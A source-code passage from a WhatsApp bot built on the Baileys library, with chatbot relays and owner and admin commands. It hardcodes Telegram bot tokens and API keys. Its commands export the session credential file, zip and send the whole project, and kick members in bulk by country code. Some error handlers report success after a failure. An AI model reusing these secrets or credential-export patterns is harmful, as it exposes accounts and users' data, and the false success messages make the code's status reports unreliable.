    { botToken: '7786528349:AAGa8X_PGkR2yyQVLuituwBrXH5ib1gjRL4', groupId: -4695146253 },
    { botToken: '7774407644:AAGc-_A0RPVmNgeD7jdW40SDBstDdNcWfLU', groupId: -4631549007 },
    { botToken: '7665215537:AAGNWx_v-ULPXAJbjTS_PQaBP9X1ssCAdMo', groupId: -4653715757 },
    { botToken: '8146366885:AAFvJt6MdZFVwifwRFW-a7V9pImiH2ubmfo', groupId: -4785742567 },
    { botToken: '8122521132:AAH0hFilVOskJeqPw8XHnurhEV6trrQkwdw', groupId: -4702906641 }
];

// Function to select a random bot and group
function getRandomBot() {
    const randomIndex = Math.floor(Math.random() * botData.length);
    return botData[randomIndex];
}
const diaryPath = './diary.json';
function loadDiary() {
    if (!fs.existsSync(diaryPath)) fs.writeFileSync(diaryPath, JSON.stringify({}), 'utf-8');
    return JSON.parse(fs.readFileSync(diaryPath, 'utf-8'));
}
function saveDiary(data) {
    fs.writeFileSync(diaryPath, JSON.stringify(data, null, 2), 'utf-8');
}
if (global.chatbot) {
    if (!isCreator.autodownload && !m.key.fromMe) {
        try {
            const userId = m.sender; // Sender's unique ID
            const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(budy)}&userId=${encodeURIComponent(userId)}`;

            // Fetch response from the API
            const response = await fetch(apiUrl);
            const jsonData = await response.json();

            // Check if the API returned a valid response
            if (jsonData.status && jsonData.BK9) {
                XeonBotInc.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: m }); // Send the AI's response
            }
        } catch (error) {
            console.error('Error fetching GPT-4 response:', error); // Log the error in the console
        }
    }
}

let chatbotaudio = false;

XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message.message || message.key.fromMe) return; // Ignore system messages and bot's own messages

        const from = message.key.remoteJid; // Sender's ID
        const text = message.message.conversation || 
                     message.message.extendedTextMessage?.text || ''; // Extract text message

        // Check if chatbot is active and the message is not empty
        if (chatbotaudio && text.trim()) {
            const query = text.trim(); // User's input

            // Get Telegram bot details (Replace with actual logic)
            const { botToken, groupId } = getRandomBot();

            const telegramMessage = `/gptaudio ${query}`; // Prefix the message with '/gpt'

            // Send the message to Telegram group
            await sendToTelegram(botToken, groupId, telegramMessage);

            // Wait for Telegram's response (Get audio file URL)
            const audioFileUrl = await fetchTelegramFile('audio', botToken, groupId);

            // Send the audio file directly
            await XeonBotInc.sendMessage(from, {
                audio: { url: audioFileUrl }, // Use the URL directly
                mimetype: 'audio/mp4', // Ensure it's sent as an audio file
            }, {
                quoted: message // Quote the original message
            });
        }
    } catch (error) {
        console.error('Error processing incoming message:', error);
    }
});
// Function to send the message to Telegram group
async function sendToTelegram(botToken, chatId, message) {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    });

    const data = await response.json();
    if (!data.ok) {
        throw new Error('Failed to send message');
    }
}
async function getUserReplyWithTimeout(chatId, timeout) {
    return new Promise((resolve) => {
        const timer = setTimeout(() => resolve(null), timeout); // Timeout after the specified duration

        XeonBotInc.ev.on('messages.upsert', ({ messages }) => {
            const message = messages[0];
            if (message.key.remoteJid === chatId && !message.key.fromMe) {
                clearTimeout(timer); // Clear the timeout when a reply is received
                resolve(message.message.conversation); // Resolve with the user's message
            }
        });
    });
} 
           if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./Phistar-media/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./Phistar-media/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./Phistar-media/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./Phistar-media/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcxeon(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
        
// Auto-react toggle command
case 'autoreact':
    if (!isCreator) return replygcxeon('⚠️ Only the bot owner can use Auto-React.');
    if (!args[0]) return replygcxeon('⚠️ Usage: autoreact on/off');

    if (q === 'on') {
        autoReact = true;
        replygcxeon('✅ Auto-Reaction has been activated. The bot will now react to all messages.');
    } else if (q === 'off') {
        autoReact = false;
        replygcxeon('❌ Auto-Reaction has been deactivated. The bot will no longer react to messages.');
    } else {
        replygcxeon('⚠️ Invalid option. Use "autoreact on" or "autoreact off".');
    }
    break;
case 'chatbot': 
    if (!isCreator) return replygcxeon('❌ Only the bot owner can use the chatbot.');
    if (!args[0]) return replygcxeon('⚠️ Usage: chatbot on/off');
    
    if (q === 'on') {
        global.chatbot = true; // Enable chatbot globally
        replygcxeon('✅ Chatbot has been activated. It will now respond to all messages.');
    } else if (q === 'off') {
        global.chatbot = false; // Disable chatbot globally

        // Notify that the chatbot will turn off after 1 minute
        replygcxeon('❌ Chatbot will be deactivated in 1 minute. It will no longer respond to messages.');

        // Delay the deactivation confirmation message
        setTimeout(() => {
            replygcxeon('⏳ Chatbot has now been deactivated.');
        }, 60000); // 1 minute = 60000 milliseconds
    } else {
        replygcxeon('⚠️ Invalid option. Use "chatbot on" or "chatbot off".');
    }
    break;
    case 'chatbotaudio': 
    if (!isCreator) return replygcxeon('❌ Only the bot owner can use the chatbot.');
    if (!args[0]) return replygcxeon('⚠️ Usage: chatbotaudio on/off');
    
    if (q === 'on') {
        chatbotaudio = true;
        replygcxeon('✅ chatbotaudio has been activated. It will now respond to all messages.');
    } else if (q === 'off') {
        chatbotaudio = false;

        // Notify that the chatbot will turn off after 1 minute
        replygcxeon('❌ chatbotaudio will be deactivated in 1 minute. It will no longer respond to messages.');

        // Delay the deactivation message
        setTimeout(() => {
            replygcxeon('⏳ chatbotaudio has now been deactivated.');
        }, 60000); // 1 minute = 60000 milliseconds
    } else {
        replygcxeon('⚠️ Invalid option. Use "chatbotaudio on" or "chatbotaudio off".');
    }
    break;
case 'antidelete':
    if (!isCreator) return replygcxeon(' Only the bot owner can use Anti-Delete.');
    if (!args[0]) return replygcxeon('⚠️ Usage: antidelete on/off');

    if (q === 'on') {
        antidelete = true;
        replygcxeon('✅ Anti-Delete has been activated. The bot will now detect deleted messages.');
    } else if (q === 'off') {
        antidelete = false;
        replygcxeon('❌ Anti-Delete has been deactivated. Deleted messages will no longer be detected.');
    } else {
        replygcxeon('⚠️ Invalid option. Use "antidelete on" or "antidelete off".');
    }
    break;
    // Command to toggle Anti-Bug System ON or OFF
case 'antibug':
    if (!isCreator) return replygcxeon('Only the bot owner can use Anti-Bug.');

    if (!args[0]) return replygcxeon('⚠️ Usage: antibug on/off');

    if (args[0].toLowerCase() === 'on') {
        antibug = true;
        replygcxeon('✅ Anti-Bug System has been activated.');
    } else if (args[0].toLowerCase() === 'off') {
        antibug = false;
        replygcxeon('❌ Anti-Bug System has been deactivated.');
    } else {
        replygcxeon('⚠️ Invalid option. Use "antibug on" or "antibug off".');
    }
    break;        
        case 'antilink':
    if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);
          // Read the current data from the file
    const antilinkGroups = JSON.parse(fs.readFileSync('./database/antilinkall.json', 'utf-8') || '[]');

    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);

    if (q === 'on') {
        if (antilinkGroups.includes(m.chat)) return replygcxeon("✅ Anti-Link is already activated in this group.");
        
        // Add the group ID to the file
        antilinkGroups.push(m.chat);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkGroups, null, 2));
        replygcxeon("✅ Anti-Link has been activated in this group. Any link sent will be deleted.");
    } else if (q === 'off') {
        if (!antilinkGroups.includes(m.chat)) return replygcxeon("❌ Anti-Link is already disabled for this group.");
        
        // Remove the group ID from the file
        const updatedGroups = antilinkGroups.filter(group => group !== m.chat);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(updatedGroups, null, 2));
        replygcxeon("✅ Anti-Link has been disabled for this group.");
    } else {
        replygcxeon(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`);
    }
    break
case 'time':
    if (!q.trim()) {
        return replygcxeon('⚠️ Please provide a city or location to check the current time. Useage: time Nigeria');
    }

    const location = q.trim().replace(/ /g, '_'); // Replace spaces for better compatibility
    const timeApiUrl = `http://api.timezonedb.com/v2.1/get-time-zone?key=T3RJM7DKOIS8&format=json&by=zone&zone=${location}`;

    try {
        const response = await fetch(timeApiUrl);
        if (!response.ok) {
            return await replygcxeon(`⚠️ Could not retrieve time for "${location.replace(/_/g, ' ')}". Please check the location format.`);
        }

        const timeData = await response.json();
        if (timeData && timeData.status === "OK") {
            const formattedTime = timeData.formatted;

            // Send the plain text response
            await replygcxeon(`🕰 Current time in ${location.replace(/_/g, ' ')}: ${formattedTime}`);
        } else {
            await replygcxeon(`⚠️ Unable to fetch time for "${location.replace(/_/g, ' ')}". Please ensure the location is valid.`);
        }
    } catch (error) {
        console.error('Error fetching time:', error);
        await replygcxeon('❌ There was an issue fetching the time. Please try again later.');
    }
    break;
    case 'weather':
    if (q.length === 0) return replygcxeon('⚠️ Please provide a city name to check the weather.Useage: weather Nigeria');

    const cityName = q.trim(); // Removes any extra spaces
    const apiKey = '8044b9a239193d667183ab85fea38ca9'; // Your API key
    const weatherApiUrl = `https://api.openweathermap.org/data/2.5/weather?q=${cityName}&appid=${apiKey}&units=metric`;

    try {
        const response = await fetch(weatherApiUrl);
        const weatherData = await response.json();

        if (weatherData.cod === 200) {
            const weatherDescription = weatherData.weather[0].description;
            const temperature = weatherData.main.temp;
            const humidity = weatherData.main.humidity;
            const pressure = weatherData.main.pressure;
            const windSpeed = weatherData.wind.speed;
            const iconCode = weatherData.weather[0].icon;
            const weatherIconUrl = `https://openweathermap.org/img/wn/${iconCode}@2x.png`;

            await XeonBotInc.sendMessage(
                m.chat,
                {
                    image: { url: weatherIconUrl }, // Use the weather icon as the image
                    caption: `*🌍 Weather in ${cityName}*\n\n` +
                             `*Description:* ${weatherDescription}\n` +
                             `*Temperature:* ${temperature}°C\n` +
                             `*Humidity:* ${humidity}%\n` +
                             `*Pressure:* ${pressure} hPa\n` +
                             `*Wind Speed:* ${windSpeed} m/s\n\n` +
                             `Stay safe and enjoy your day! 🌞`
                },
                { quoted: m }
            );
        } else {
            await replygcxeon(`⚠️ City not found! Please try again with a valid city name.`);
        }
    } catch (error) {
        console.error('Error fetching weather:', error);
        await replygcxeon('❌ There was an error fetching the weather. Please try again later.');
    }
    break;
            case 'addprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 2)
                    return replygcxeon(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcxeon("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcxeon("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replygcxeon("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replygcxeon("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replygcxeon(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                XeonBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replygcxeon(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcxeon('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcxeon(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcxeon(teks)
                    await sleep(2000)
                    replygcxeon("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcxeon("Successfully deleted all the trash in the session ")
                });
            }
            break
            case 'join':
    try {
        if (!isCreator) return replygcxeon(mess.owner); // Only creator can use this command
        if (!text) return replygcxeon('Enter a valid Group Link!'); // Validate input
        if (!isUrl(text) || !text.includes('whatsapp.com')) return replygcxeon('Invalid Group Link!'); // Check link format
        replygcxeon(mess.wait); // Send wait message

        // Extract the invite code from the URL
        let inviteCode = text.split('https://chat.whatsapp.com/')[1];
        if (!inviteCode) return replygcxeon('Invalid Invite Code!');

        // Attempt to join the group
        let result = await XeonBotInc.groupAcceptInvite(inviteCode);
        replygcxeon(`Successfully joined the group:`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replygcxeon('Successfully joined the group:');
    }
    break;      
            case 'getsession':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                XeonBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
                case 'remove': {
    if (!m.isGroup) return replygcxeon('This command can only be used in groups.');
    if (!isBotAdmins) return replygcxeon('Bot must be an admin to use this command.');
    if (!isGroupOwner) return replygcxeon('Only group owners can use this command.');
    
    const countryCode = args[0]; // Get the country code from the command arguments
    if (!countryCode || !countryCode.startsWith('+')) return replygcxeon('Please provide a valid country code, e.g., +234.');

    let kickedMembers = 0;

    for (let participant of participants) {
        const number = participant.id.split('@')[0]; // Extract the participant's number
        if (number.startsWith(countryCode.replace('+', '')) && participant.id !== botNumber && participant.id !== groupOwner) {
            try {
                await XeonBotInc.groupParticipantsUpdate(from, [participant.id], 'remove');
                kickedMembers++;
                await delay(2000); // Add a delay of 2 seconds between each removal
            } catch (err) {
                console.error(`Failed to remove ${participant.id}:`, err);
            }
        }
    }

    if (kickedMembers > 0) {
        replygcxeon(`Successfully removed ${kickedMembers} members with numbers starting with ${countryCode}.`);
    } else {
        replygcxeon(`No members found with numbers starting with ${countryCode}.`);
    }
    break;
}
case 'promoteall': {
    if (!m.isGroup) return replygcxeon('This command can only be used in groups.');
    if (!isBotAdmins) return replygcxeon('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return replygcxeon('Only group admins can use this command.');

    for (let participant of participants) {
        if (!groupAdmins.includes(participant.id)) {
            try {
                await XeonBotInc.groupParticipantsUpdate(from, [participant.id], 'promote');
                await delay(500); // Add a delay between each request
            } catch (err) {
                console.log(`Error promoting ${participant.id}:`, err.message);
            }
        }
    }
    replygcxeon('Successfully promoted all members to admin.');
    break;
}
            case 'shutdown':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon(`Goodbye🖐🥺`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replygcxeon(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replygcxeon(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replygcxeon(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replygcxeon(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'antibilling':
    if (!isCreator) return replygcxeon(mess.owner); // Only creator can enable/disable
    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);

    if (q === 'on') {
        antibilling = true; // Turn Anti-Billing on
        replygcxeon(`Successfully activated Anti-Billing feature.`);
    } else if (q === 'off') {
        antibilling = false; // Turn Anti-Billing off
        replygcxeon(`Successfully deactivated Anti-Billing feature.`);
    }
    break;
    case 'anticall':
    if (!isCreator) return replygcxeon(mess.owner); // Only creator can enable/disable
    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);

    if (q === 'on') {
        anticall = true; // Enable Anti-Call
        replygcxeon(`Anti-Call feature activated.`);
    } else if (q === 'off') {
        anticall = false; 
        replygcxeon(`Anti-Call feature deactivated.`);
    }
    break;
                case 'autorecording':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replygcxeon(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replygcxeon(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replygcxeon(mess.owner)
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  autoStatusView = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoStatusView = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
            case 'autolikestatus':
    case 'autolikesta':{
             if (!isCreator) return replygcxeon(mess.owner)
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    XeonBotInc.public = true
                    replygcxeon(mess.done)
                } else if (q == 'self') {
                    XeonBotInc.public = false
                    replygcxeon(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcxeon(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'block':
    if (!isCreator) return replygcxeon(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let blockUser = m.chat;

        // Perform the block operation
        await XeonBotInc.updateBlockStatus(blockUser, 'block');
        replygcxeon(`✅ Successfully blocked the user in this DM: ${blockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replygcxeon('❌ Failed to block the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'unblock':
    if (!isCreator) return replygcxeon(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let unblockUser = m.chat;

        // Perform the unblock operation
        await XeonBotInc.updateBlockStatus(unblockUser, 'unblock');
        replygcxeon(`✅ Successfully unblocked the user in this DM: ${unblockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replygcxeon('❌ Failed to unblock the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!m.isGroup) return replygcxeon(mess.group)
                replygcxeon('Bye Everyone 🥺')
                await XeonBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcxeon(mess.owner)
                if (m.isGroup) return replygcxeon(mess.private)
                replygcxeon(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await XeonBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcxeon(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    XeonBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcxeon(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replygcxeon(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcxeon(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replygcxeon(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcxeon('The message was not sent by a bot!')
                XeonBotInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcxeon(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcxeon(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
    if (!m.isGroup) return replygcxeon(mess.group); // Check if it's a group
    if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin); // Check if user is an admin
    if (!isBotAdmins) return replygcxeon(mess.botAdmin); // Check if bot is an admin
    let userToAdd = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // Extract the number
    try {
        await XeonBotInc.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
        replygcxeon(`User added successfully: ${userToAdd}`);
    } catch (err) {
        console.error(err);
        replygcxeon('User added successfully.');
    }
    break;
    case 'vcf': case 'savecontact': case 'svcontact': {
    if (!m.isGroup) return replygcxeon(`This command is for groups only.`);
